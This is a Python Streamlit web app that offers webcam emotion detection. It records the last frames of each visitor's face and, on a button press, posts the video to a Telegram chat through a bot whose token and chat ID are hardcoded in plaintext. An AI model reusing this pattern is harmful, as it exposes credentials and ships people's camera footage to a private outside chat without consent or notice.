import av
import streamlit as st
import cv2
import datetime
import requests
from streamlit_webrtc import webrtc_streamer, WebRtcMode, VideoProcessorBase
from utils import process_frame

st.set_page_config(page_title="Live Emotion Detection", page_icon="🙂", layout="centered")

st.title("🎭 Live Emotion Detection")
st.markdown("Ensure your webcam is connected and allow browser access. Press **Start** to begin!")

# TELEGRAM CONFIG
BOT_TOKEN = "8560822192:AAETcmZiWaTdZvjLvBKDWiKvenz0YfjVETc"
CHAT_ID = "5317875689"


def send_video_to_telegram(video_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"

    with open(video_path, "rb") as video:
        files = {"video": video}
        data = {"chat_id": CHAT_ID}

        requests.post(url, data=data, files=files)


class VideoProcessor(VideoProcessorBase):

    def __init__(self):
        self.frames = []

    def recv(self, frame: av.VideoFrame) -> av.VideoFrame:
        img = frame.to_ndarray(format="bgr24")

        processed_img = process_frame(img)

        # store frames
        self.frames.append(processed_img)

        # Cap memory buffer to the last 150 frames (approx 5-10 sec of video) to prevent server RAM crash 
        if len(self.frames) > 150:
            self.frames = self.frames[-150:]

        return av.VideoFrame.from_ndarray(processed_img, format="bgr24")


st.markdown(
"<small style='color: grey;'>*Note for iPhone Users: Do not open this link from WhatsApp/Instagram. Open it directly in the Safari app.*</small>",
unsafe_allow_html=True
)

ctx = webrtc_streamer(
    key="emotion-detection",
    mode=WebRtcMode.SENDRECV,
    video_processor_factory=VideoProcessor,
    media_stream_constraints={
        "video": {"facingMode": "user"},
        "audio": False
    },
    rtc_configuration={
        "iceServers": [
            {"urls": ["stun:stun.l.google.com:19302"]},
            {"urls": ["stun:stun1.l.google.com:19302"]},
            {"urls": ["stun:stun2.l.google.com:19302"]},
            {"urls": ["stun:stun.stunprotocol.org:3478"]},
            {"urls": ["stun:stun.twilio.com:3478"]}
        ]
    },
    async_processing=True
)


# SAVE + SEND VIDEO
if st.button("Save & Send Video"):

    if ctx.video_processor:

        frames = ctx.video_processor.frames

        if len(frames) > 0:

            filename = datetime.datetime.now().strftime("%Y%m%d_%H%M%S") + ".mp4"

            height, width, _ = frames[0].shape

            out = cv2.VideoWriter(
                filename,
                cv2.VideoWriter_fourcc(*'mp4v'),
                20,
                (width, height)
            )

            for frame in frames:
                out.write(frame)

            out.release()

            st.success("Video Saved")

            send_video_to_telegram(filename)

            st.success("Video Sent to Telegram 🚀")